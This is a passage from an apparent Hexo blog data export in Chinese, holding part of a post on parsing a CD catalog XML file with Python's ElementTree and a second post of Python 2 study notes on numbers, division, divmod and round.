class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">TITLE</span>&gt;</span>Hide your heart<span class=\"tag\">&lt;/<span class=\"name\">TITLE</span>&gt;</span></div><div class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">ARTIST</span>&gt;</span>Bonnie Tyler<span class=\"tag\">&lt;/<span class=\"name\">ARTIST</span>&gt;</span></div><div class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">COUNTRY</span>&gt;</span>UK<span class=\"tag\">&lt;/<span class=\"name\">COUNTRY</span>&gt;</span></div><div class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">COMPANY</span>&gt;</span>CBS Records<span class=\"tag\">&lt;/<span class=\"name\">COMPANY</span>&gt;</span></div><div class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">PRICE</span>&gt;</span>9.90<span class=\"tag\">&lt;/<span class=\"name\">PRICE</span>&gt;</span></div><div class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">YEAR</span>&gt;</span>1988<span class=\"tag\">&lt;/<span class=\"name\">YEAR</span>&gt;</span></div><div class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">CD</span>&gt;</span></div><div class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">CD</span>&gt;</span></div><div class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">TITLE</span>&gt;</span>Greatest Hits<span class=\"tag\">&lt;/<span class=\"name\">TITLE</span>&gt;</span></div><div class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">ARTIST</span>&gt;</span>Dolly Parton<span class=\"tag\">&lt;/<span class=\"name\">ARTIST</span>&gt;</span></div><div class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">COUNTRY</span>&gt;</span>USA<span class=\"tag\">&lt;/<span class=\"name\">COUNTRY</span>&gt;</span></div><div class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">COMPANY</span>&gt;</span>RCA<span class=\"tag\">&lt;/<span class=\"name\">COMPANY</span>&gt;</span></div><div class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">PRICE</span>&gt;</span>9.90<span class=\"tag\">&lt;/<span class=\"name\">PRICE</span>&gt;</span></div><div class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">YEAR</span>&gt;</span>1982<span class=\"tag\">&lt;/<span class=\"name\">YEAR</span>&gt;</span></div><div class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">CD</span>&gt;</span></div><div class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">CD</span>&gt;</span></div><div class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">TITLE</span>&gt;</span>Still got the blues<span class=\"tag\">&lt;/<span class=\"name\">TITLE</span>&gt;</span></div><div class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">ARTIST</span>&gt;</span>Gary Moore<span class=\"tag\">&lt;/<span class=\"name\">ARTIST</span>&gt;</span></div><div class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">COUNTRY</span>&gt;</span>UK<span class=\"tag\">&lt;/<span class=\"name\">COUNTRY</span>&gt;</span></div><div class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">COMPANY</span>&gt;</span>Virgin records<span class=\"tag\">&lt;/<span class=\"name\">COMPANY</span>&gt;</span></div><div class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">PRICE</span>&gt;</span>10.20<span class=\"tag\">&lt;/<span class=\"name\">PRICE</span>&gt;</span></div><div class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">YEAR</span>&gt;</span>1990<span class=\"tag\">&lt;/<span class=\"name\">YEAR</span>&gt;</span></div><div class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">CD</span>&gt;</span></div><div class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">CD</span>&gt;</span></div><div class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">TITLE</span>&gt;</span>Eros<span class=\"tag\">&lt;/<span class=\"name\">TITLE</span>&gt;</span></div><div class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">ARTIST</span>&gt;</span>Eros Ramazzotti<span class=\"tag\">&lt;/<span class=\"name\">ARTIST</span>&gt;</span></div><div class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">COUNTRY</span>&gt;</span>EU<span class=\"tag\">&lt;/<span class=\"name\">COUNTRY</span>&gt;</span></div><div class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">COMPANY</span>&gt;</span>BMG<span class=\"tag\">&lt;/<span class=\"name\">COMPANY</span>&gt;</span></div><div class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">PRICE</span>&gt;</span>9.90<span class=\"tag\">&lt;/<span class=\"name\">PRICE</span>&gt;</span></div><div class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">YEAR</span>&gt;</span>1997<span class=\"tag\">&lt;/<span class=\"name\">YEAR</span>&gt;</span></div><div class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">CD</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">CATALOG</span>&gt;</span></div></pre></td></tr></table></figure></p>\n<h3 id=\"2-代码\"><a href=\"#2-代码\" class=\"headerlink\" title=\"2. 代码\"></a>2. 代码</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">import</span> json</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">try</span>:</div><div class=\"line\">    <span class=\"keyword\">import</span> xml.etree.cElementTree <span class=\"keyword\">as</span> ET</div><div class=\"line\"><span class=\"keyword\">except</span> ImportError:</div><div class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">'no c version Element Tree'</span></div><div class=\"line\">    <span class=\"keyword\">import</span> xml.etree.ElementTree <span class=\"keyword\">as</span> ET</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">parse_xml</span><span class=\"params\">()</span>:</span></div><div class=\"line\">    properties = &#123;&#125;;</div><div class=\"line\"></div><div class=\"line\">    tree = ET.parse(<span class=\"string\">\"cd.xml\"</span>);</div><div class=\"line\">    docs = tree.getroot();</div><div class=\"line\"></div><div class=\"line\">    print_all_artist(docs);</div><div class=\"line\">    print_all_cd_name_and_price(docs);</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">print_all_artist</span><span class=\"params\">(docs)</span>:</span></div><div class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">'----------------------------'</span></div><div class=\"line\">    <span class=\"keyword\">for</span> doc <span class=\"keyword\">in</span> docs.iter(<span class=\"string\">\"ARTIST\"</span>):</div><div class=\"line\">        <span class=\"keyword\">print</span> doc.text</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">print_all_cd_name_and_price</span><span class=\"params\">(docs)</span>:</span></div><div class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">'----------------------------'</span></div><div class=\"line\">    <span class=\"keyword\">for</span> doc <span class=\"keyword\">in</span> docs:</div><div class=\"line\">        line = <span class=\"string\">''</span></div><div class=\"line\">        <span class=\"keyword\">for</span> field <span class=\"keyword\">in</span> doc:</div><div class=\"line\">            <span class=\"keyword\">if</span> field.tag == <span class=\"string\">'TITLE'</span>:</div><div class=\"line\">                line = line + field.text + <span class=\"string\">\"\\t\"</span></div><div class=\"line\"></div><div class=\"line\">            <span class=\"keyword\">if</span> field.tag == <span class=\"string\">'PRICE'</span>:</div><div class=\"line\">                line = line + field.text + <span class=\"string\">\"\\t\"</span></div><div class=\"line\"></div><div class=\"line\">        <span class=\"keyword\">print</span> line</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</div><div class=\"line\">    parse_xml();</div></pre></td></tr></table></figure>\n<h3 id=\"3-运行结果\"><a href=\"#3-运行结果\" class=\"headerlink\" title=\"3. 运行结果\"></a>3. 运行结果</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div></pre></td><td class=\"code\"><pre><div class=\"line\">yerba-buena:~ yeshaoting$ python parse_<span class=\"built_in\">cd</span>_xml.py</div><div class=\"line\">----------------------------</div><div class=\"line\">Bob Dylan</div><div class=\"line\">Bonnie Tyler</div><div class=\"line\">Dolly Parton</div><div class=\"line\">Gary Moore</div><div class=\"line\">Eros Ramazzotti</div><div class=\"line\">----------------------------</div><div class=\"line\">Empire Burlesque\t10.90</div><div class=\"line\">Hide your heart\t9.90</div><div class=\"line\">Greatest Hits\t9.90</div><div class=\"line\">Still got the blues\t10.20</div><div class=\"line\">Eros\t9.90</div></pre></td></tr></table></figure>\n<h2 id=\"四、参考文档\"><a href=\"#四、参考文档\" class=\"headerlink\" title=\"四、参考文档\"></a>四、参考文档</h2><ul>\n<li><a href=\"http://codingpy.com/article/parsing-xml-using-python/\">深入解读Python解析XML的几种方式</a></li>\n<li><a href=\"http://www.cnblogs.com/ifantastic/archive/2013/04/12/3017110.html\">Python 标准库之 xml.etree.ElementTree</a></li>\n<li><a href=\"http://www.runoob.com/python/python-xml.html\">Python XML解析</a></li>\n</ul>"},{"title":"《跟老齐学Python》学习笔记-数","date":"2016-05-01T14:34:00.000Z","_content":"<img src=\"/asserts/images/logo/python.png\" class=\"img-logo img-center\" />\n\n**注**：所有示例基于python2。\n**注**：由于老齐的教程面向零基础，简单通俗适用于编程新手；其篇幅又过长，很不适合已经熟知其他编程语言的人员使用，后期打算换用其他的教程进行学习。\n\n## 一、数和四则运算\n\n### 1. 查看对象内存地址：id()\n``` python\n>>> id(8)\n140200127779760\n>>> id(23.56)\n140200127787712\n```\n\n### 2. 查看对象类型：type()\n``` python\n>>> type(2)\n<type 'int'>\n>>> type(3.4)\n<type 'float'>\n>>> type(23333333333333333333)\n<type 'long'>\n>>> type('yeshaoting')\n<type 'str'>\n```\n\n### 3. 对象有类型，变量无类型\npython中变量仅仅只一个标识，指向某个存储空间。\n程序执行赛程中其类型可以任意修改。\n相对于java强类型言语而言，python是弱类型的。\n``` python\n>>> a=2; type(a); a=3.4; type(a);\n<type 'int'>\n<type 'float'>\n```\n\n### 4. 浮点数与整数运算结果是浮点数。\n\n### 5. 运算溢出问题\n整数间运算不会出现整数溢出问题，但是如果与浮点数一起计算就有可能出现溢出问题。\n\n参见：https://github.com/yeshaoting/StarterLearningPython/blob/master/102.md\n\n\n<!-- more -->\n\n## 二、除法\n\n### 1. 整型相除\n整型相除结果是商(结果不会四舍五入)，不会出现小数。例如：\n``` python\n>>> 4/5\n0\n```\n\n### 2. 浮点数运算结果是浮点数，不会出现四舍五入的情况。\n\n### 3. 引用division模块解决除法问题\ndivision模块重新定义了除法的一些特性，如：整数相除得到的结果是一个浮点数。\n``` python\n>>> from __future__ import division\n>>> 3/4\n0.75\n>>> 2/3\n0.6666666666666666\n```\n\n### 4. 取余\n取余数可使用`%`，例如：\n``` python\n>>>> 4%5\n4\n```\n\n### 4. 内建函数divmod\npython提供的内建函数divmod也能为除法运算一次性返回商和余数。例如：\n``` python\n>>> divmod(2, 3)\n(0, 2)\n>>> divmod(3, 1)\n(3, 0)\n>>> divmod(3, 2)\n(1, 1)\n```\n\n\n### 5. 四舍五入\n内建函数round() 方法返回浮点数x的四舍五入值。\n\n``` python\n>>> round(2, 3)\n2.0\n>>> round(2/3, 1)\n0.7\n>>> round(2/3, 0)\n1.0\n>>> round(2/4, 0)\n1.0\n```\n\n参见：https://github.com/yeshaoting/StarterLearningPython/blob/master/103.md\n\n","source":"_posts/article/python/《跟老齐学Python》学习笔记-数.md","raw":"tags:\n  - python\n  - 学习笔记\ncategories:\n  - 系统脚本\ntitle: 《跟老齐学Python》学习笔记-数\ndate: 2016-05-01 22:34:00\n---\n<img src=\"/asserts/images/logo/python.png\" class=\"img-logo img-center\" />\n\n**注**：所有示例基于python2。\n**注**：由于老齐的教程面向零基础，简单通俗适用于编程新手；其篇幅又过长，很不适合已经熟知其他编程语言的人员使用，后期打算换用其他的教程进行学习。\n\n## 一、数和四则运算\n\n### 1. 查看对象内存地址：id()\n``` python\n>>> id(8)\n140200127779760\n>>> id(23.56)\n140200127787712\n```\n\n### 2. 查看对象类型：type()\n``` python\n>>> type(2)\n<type 'int'>\n>>> type(3.4)\n<type 'float'>\n>>> type(23333333333333333333)\n<type 'long'>\n>>> type('yeshaoting')\n<type 'str'>\n```\n\n### 3. 对象有类型，变量无类型\npython中变量仅仅只一个标识，指向某个存储空间。\n程序执行赛程中其类型可以任意修改。\n相对于java强类型言语而言，python是弱类型的。\n``` python\n>>> a=2; type(a); a=3.4; type(a);\n<type 'int'>\n<type 'float'>\n```\n\n### 4. 浮点数与整数运算结果是浮点数。\n\n### 5. 运算溢出问题\n整数间运算不会出现整数溢出问题，但是如果与浮点数一起计算就有可能出现溢出问题。\n\n参见：https://github.com/yeshaoting/StarterLearningPython/blob/master/102.md\n\n\n<!-- more -->\n\n## 二、除法\n\n### 1. 整型相除\n整型相除结果是商(结果不会四舍五入)，不会出现小数。例如：\n``` python\n>>> 4/5\n0\n```\n\n### 2. 浮点数运算结果是浮点数，不会出现四舍五入的情况。\n\n### 3. 引用division模块解决除法问题\ndivision模块重新定义了除法的一些特性，如：整数相除得到的结果是一个浮点数。\n``` python\n>>> from __future__ import division\n>>> 3/4\n0.75\n>>> 2/3\n0.6666666666666666\n```\n\n### 4. 取余\n取余数可使用`%`，例如：\n``` python\n>>>> 4%5\n4\n```\n\n### 4. 内建函数divmod\npython提供的内建函数divmod也能为除法运算一次性返回商和余数。例如：\n``` python\n>>> divmod(2, 3)\n(0, 2)\n>>> divmod(3, 1)\n(3, 0)\n>>> divmod(3, 2)\n(1, 1)\n```\n\n\n### 5. 四舍五入\n内建函数round() 方法返回浮点数x的四舍五入值。\n\n``` python\n>>> round(2, 3)\n2.0\n>>> round(2/3, 1)\n0.7\n>>> round(2/3, 0)\n1.0\n>>> round(2/4, 0)\n1.0\n```\n\n参见：https://github.com/yeshaoting/StarterLearningPython/blob/master/103.md\n\n","slug":"article/python/《跟老齐学Python》学习笔记-数","published":1,"updated":"2016-08-20T07:13:48.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cis6vlxv2007f5nbtx91vheax","content":"<p><img src=\"/asserts/images/logo/python.png\" class=\"img-logo img-center\"></p>\n<p><strong>注</strong>：所有示例基于python2。<br><strong>注</strong>：由于老齐的教程面向零基础，简单通俗适用于编程新手；其篇幅又过长，很不适合已经熟知其他编程语言的人员使用，后期打算换用其他的教程进行学习。</p>\n<h2 id=\"一、数和四则运算\"><a href=\"#一、数和四则运算\" class=\"headerlink\" title=\"一、数和四则运算\"></a>一、数和四则运算</h2><h3 id=\"1-查看对象内存地址：id\"><a href=\"#1-查看对象内存地址：id\" class=\"headerlink\" title=\"1. 查看对象内存地址：id()\"></a>1. 查看对象内存地址：id()</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>id(<span class=\"number\">8</span>)</div><div class=\"line\"><span class=\"number\">140200127779760</span></div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>id(<span class=\"number\">23.56</span>)</div><div class=\"line\"><span class=\"number\">140200127787712</span></div></pre></td></tr></table></figure>\n<h3 id=\"2-查看对象类型：type\"><a href=\"#2-查看对象类型：type\" class=\"headerlink\" title=\"2. 查看对象类型：type()\"></a>2. 查看对象类型：type()</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>type(<span class=\"number\">2</span>)</div><div class=\"line\">&lt;type <span class=\"string\">'int'</span>&gt;</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>type(<span class=\"number\">3.4</span>)</div><div class=\"line\">&lt;type <span class=\"string\">'float'</span>&gt;</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>type(<span class=\"number\">23333333333333333333</span>)</div><div class=\"line\">&lt;type <span class=\"string\">'long'</span>&gt;</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>type(<span class=\"string\">'yeshaoting'</span>)</div><div class=\"line\">&lt;type <span class=\"string\">'str'</span>&gt;</div></pre></td></tr></table></figure>\n<h3 id=\"3-对象有类型，变量无类型\"><a href=\"#3-对象有类型，变量无类型\" class=\"headerlink\" title=\"3. 对象有类型，变量无类型\"></a>3. 对象有类型，变量无类型</h3><p>python中变量仅仅只一个标识，指向某个存储空间。<br>程序执行赛程中其类型可以任意修改。<br>相对于java强类型言语而言，python是弱类型的。<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>a=<span class=\"number\">2</span>; type(a); a=<span class=\"number\">3.4</span>; type(a);</div><div class=\"line\">&lt;type <span class=\"string\">'int'</span>&gt;</div><div class=\"line\">&lt;type <span class=\"string\">'float'</span>&gt;</div></pre></td></tr></table></figure></p>\n<h3 id=\"4-浮点数与整数运算结果是浮点数。\"><a href=\"#4-浮点数与整数运算结果是浮点数。\" class=\"headerlink\" title=\"4. 浮点数与整数运算结果是浮点数。\"></a>4. 浮点数与整数运算结果是浮点数。</h3><h3 id=\"5-运算溢出问题\"><a href=\"#5-运算溢出问题\" class=\"headerlink\" title=\"5. 运算溢出问题\"></a>5. 运算溢出问题</h3><p>整数间运算不会出现整数溢出问题，但是如果与浮点数一起计算就有可能出现溢出问题。</p>\n<p>参见：<a href=\"https://github.com/yeshaoting/StarterLearningPython/blob/master/102.md\" target=\"_blank\" rel=\"external\">https://github.com/yeshaoting/StarterLearningPython/blob/master/102.md</a></p>\n<a id=\"more\"></a>\n<h2 id=\"二、除法\"><a href=\"#二、除法\" class=\"headerlink\" title=\"二、除法\"></a>二、除法</h2><h3 id=\"1-整型相除\"><a href=\"#1-整型相除\" class=\"headerlink\" title=\"1. 整型相除\"></a>1. 整型相除</h3><p>整型相除结果是商(结果不会四舍五入)，不会出现小数。例如：<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span><span class=\"number\">4</span>/<span class=\"number\">5</span></div><div class=\"line\"><span class=\"number\">0</span></div></pre></td></tr></table></figure></p>\n<h3 id=\"2-浮点数运算结果是浮点数，不会出现四舍五入的情况。\"><a href=\"#2-浮点数运算结果是浮点数，不会出现四舍五入的情况。\" class=\"headerlink\" title=\"2. 浮点数运算结果是浮点数，不会出现四舍五入的情况。\"></a>2. 浮点数运算结果是浮点数，不会出现四舍五入的情况。</h3><h3 id=\"3-引用division模块解决除法问题\"><a href=\"#3-引用division模块解决除法问题\" class=\"headerlink\" title=\"3. 引用division模块解决除法问题\"></a>3. 引用division模块解决除法问题</h3><p>division模块重新定义了除法的一些特性，如：整数相除得到的结果是一个浮点数。<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span><span class=\"keyword\">from</span> __future__ <span class=\"keyword\">import</span> division</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span><span class=\"number\">3</span>/<span class=\"number\">4</span></div><div class=\"line\"><span class=\"number\">0.75</span></div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span><span class=\"number\">2</span>/<span class=\"number\">3</span></div><div class=\"line\"><span class=\"number\">0.6666666666666666</span></div></pre></td></tr></table></figure></p>\n<h3 id=\"4-取余\"><a href=\"#4-取余\" class=\"headerlink\" title=\"4. 取余\"></a>4. 取余</h3><p>取余数可使用<code>%</code>，例如：<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">&gt;&gt;&gt;&gt; <span class=\"number\">4</span>%<span class=\"number\">5</span></div><div class=\"line\"><span class=\"number\">4</span></div></pre></td></tr></table></figure></p>\n<h3 id=\"4-内建函数divmod\"><a href=\"#4-内建函数divmod\" class=\"headerlink\" title=\"4. 内建函数divmod\"></a>4. 内建函数divmod</h3><p>python提供的内建函数divmod也能为除法运算一次性返回商和余数。例如：<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>divmod(<span class=\"number\">2</span>, <span class=\"number\">3</span>)</div><div class=\"line\">(<span class=\"number\">0</span>, <span class=\"number\">2</span>)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>divmod(<span class=\"number\">3</span>, <span class=\"number\">1</span>)</div><div class=\"line\">(<span class=\"number\">3</span>, <span class=\"number\">0</span>)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>divmod(<span class=\"number\">3</span>, <span class=\"number\">2</span>)</div><div class=\"line\">(<span class=\"number\">1</span>, <span class=\"number\">1</span>)</div></pre></td></tr></table></figure></p>\n<h3 id=\"5-四舍五入\"><a href=\"#5-四舍五入\" class=\"headerlink\" title=\"5. 四舍五入\"></a>5. 四舍五入</h3><p>内建函数round() 方法返回浮点数x的四舍五入值。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>round(<span class=\"number\">2</span>, <span class=\"number\">3</span>)</div><div class=\"line\"><span class=\"number\">2.0</span></div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>round(<span class=\"number\">2</span>/<span class=\"number\">3</span>, <span class=\"number\">1</span>)</div><div class=\"line\"><span class=\"number\">0.7</span></div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>round(<span class=\"number\">2</span>/<span class=\"number\">3</span>, <span class=\"number\">0</span>)</div><div class=\"line\"><span class=\"number\">1.0</span></div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>round(<span class=\"number\">2</span>/<span class=\"number\">4</span>, <span class=\"number\">0</span>)</div><div class=\"line\"><span class=\"number\">1.0</span></div></pre></td></tr></table></figure>\n<p>参见：<a href=\"https://github.com/yeshaoting/StarterLearningPython/blob/master/103.md\" target=\"_blank\" rel=\"external\">https://github.com/yeshaoting/StarterLearningPython/blob/master/103.md</a></p>\n","excerpt":"<p><img src=\"/asserts/images/logo/python.png\" class=\"img-logo img-center\" /></p>\n<p><strong>注</strong>：所有示例基于python2。<br><strong>注</strong>：由于老齐的教程面向零基础，简单通俗适用于编程新手；其篇幅又过长，很不适合已经熟知其他编程语言的人员使用，后期打算换用其他的教程进行学习。</p>\n<h2 id=\"一、数和四则运算\"><a href=\"#一、数和四则运算\" class=\"headerlink\" title=\"一、数和四则运算\"></a>一、数和四则运算</h2><h3 id=\"1-查看对象内存地址：id\"><a href=\"#1-查看对象内存地址：id\" class=\"headerlink\" title=\"1. 查看对象内存地址：id()\"></a>1. 查看对象内存地址：id()</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>id(<span class=\"number\">8</span>)</div><div class=\"line\"><span class=\"number\">140200127779760</span></div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>id(<span class=\"number\">23.56</span>)</div><div class=\"line\"><span class=\"number\">140200127787712</span></div></pre></td></tr></table></figure>\n<h3 id=\"2-查看对象类型：type\"><a href=\"#2-查看对象类型：type\" class=\"headerlink\" title=\"2. 查看对象类型：type()\"></a>2. 查看对象类型：type()</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>type(<span class=\"number\">2</span>)</div><div class=\"line\">&lt;type <span class=\"string\">'int'</span>&gt;</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>type(<span class=\"number\">3.4</span>)</div><div class=\"line\">&lt;type <span class=\"string\">'float'</span>&gt;</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>type(<span class=\"number\">23333333333333333333</span>)</div><div class=\"line\">&lt;type <span class=\"string\">'long'</span>&gt;</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>type(<span class=\"string\">'yeshaoting'</span>)</div><div class=\"line\">&lt;type <span class=\"string\">'str'</span>&gt;</div></pre></td></tr></table></figure>\n<h3 id=\"3-对象有类型，变量无类型\"><a href=\"#3-对象有类型，变量无类型\" class=\"headerlink\" title=\"3. 对象有类型，变量无类型\"></a>3. 对象有类型，变量无类型</h3><p>python中变量仅仅只一个标识，指向某个存储空间。<br>程序执行赛程中其类型可以任意修改。<br>相对于java强类型言语而言，python是弱类型的。<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>a=<span class=\"number\">2</span>; type(a); a=<span class=\"number\">3.4</span>; type(a);</div><div class=\"line\">&lt;type <span class=\"string\">'int'</span>&gt;</div><div class=\"line\">&lt;type <span class=\"string\">'float'</span>&gt;</div></pre></td></tr></table></figure></p>\n<h3 id=\"4-浮点数与整数运算结果是浮点数。\"><a href=\"#4-浮点数与整数运算结果是浮点数。\" class=\"headerlink\" title=\"4. 浮点数与整数运算结果是浮点数。\"></a>4. 浮点数与整数运算结果是浮点数。</h3><h3 id=\"5-运算溢出问题\"><a href=\"#5-运算溢出问题\" class=\"headerlink\" title=\"5. 运算溢出问题\"></a>5. 运算溢出问题</h3><p>整数间运算不会出现整数溢出问题，但是如果与浮点数一起计算就有可能出现溢出问题。</p>\n<p>参见：<a href=\"https://github.com/yeshaoting/StarterLearningPython/blob/master/102.md\">https://github.com/yeshaoting/StarterLearningPython/blob/master/102.md</a></p>","more":"<h2 id=\"二、除法\"><a href=\"#二、除法\" class=\"headerlink\" title=\"二、除法\"></a>二、除法</h2><h3 id=\"1-整型相除\"><a href=\"#1-整型相除\" class=\"headerlink\" title=\"1. 整型相除\"></a>1. 整型相除</h3><p>整型相除结果是商(结果不会四舍五入)，不会出现小数。例如：<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span><span class=\"number\">4</span>/<span class=\"number\">5</span></div><div class=\"line\"><span class=\"number\">0</span></div></pre></td></tr></table></figure></p>\n<h3 id=\"2-浮点数运算结果是浮点数，不会出现四舍五入的情况。\"><a 